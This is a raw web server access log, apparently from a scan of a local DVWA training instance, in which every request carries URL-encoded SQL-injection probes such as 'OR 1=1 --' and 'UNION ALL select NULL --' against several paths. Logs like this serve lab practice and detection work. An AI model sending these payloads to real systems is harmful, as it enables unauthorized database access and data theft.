172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%22 HTTP/1.1" 301 550 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=%3B HTTP/1.1" 301 540 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%3B HTTP/1.1" 301 550 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=%29 HTTP/1.1" 301 540 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%29 HTTP/1.1" 301 550 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query+AND+1%3D1+--+ HTTP/1.1" 301 572 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query+AND+1%3D1 HTTP/1.1" 301 564 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%27+AND+%271%27%3D%271 HTTP/1.1" 301 588 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%22+AND+%221%22%3D%221 HTTP/1.1" 301 588 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 596 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 621 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:25 +0000] "GET /docs?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 608 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=%27 HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%27 HTTP/1.1" 301 550 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=%22 HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%22 HTTP/1.1" 301 550 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=%3B HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%3B HTTP/1.1" 301 550 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=%29 HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%29 HTTP/1.1" 301 550 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query+AND+1%3D1+--+ HTTP/1.1" 301 572 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query+AND+1%3D1 HTTP/1.1" 301 564 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%27+AND+%271%27%3D%271 HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%22+AND+%221%22%3D%221 HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 596 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 608 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=%27 HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%27 HTTP/1.1" 301 558 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=%22 HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%22 HTTP/1.1" 301 558 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=%3B HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%3B HTTP/1.1" 301 558 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=%29 HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%29 HTTP/1.1" 301 558 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query+AND+1%3D1+--+ HTTP/1.1" 301 580 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query+AND+1%3D1 HTTP/1.1" 301 572 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%27+AND+%271%27%3D%271 HTTP/1.1" 301 596 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%22+AND+%221%22%3D%221 HTTP/1.1" 301 596 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 604 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=%27 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%27 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%22 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=%3B HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%3B HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=%29 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%29 HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query+AND+1%3D1+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query+AND+1%3D2+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query+OR+1%3D1+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query+AND+1%3D2+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query+OR+1%3D1+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/login.css HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%27 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=%27 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%27 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%22 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=%3B HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%3B HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=%29 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%29 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query+AND+1%3D1+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query+AND+1%3D2+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query+OR+1%3D1+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query+AND+1%3D2+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query+OR+1%3D1+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
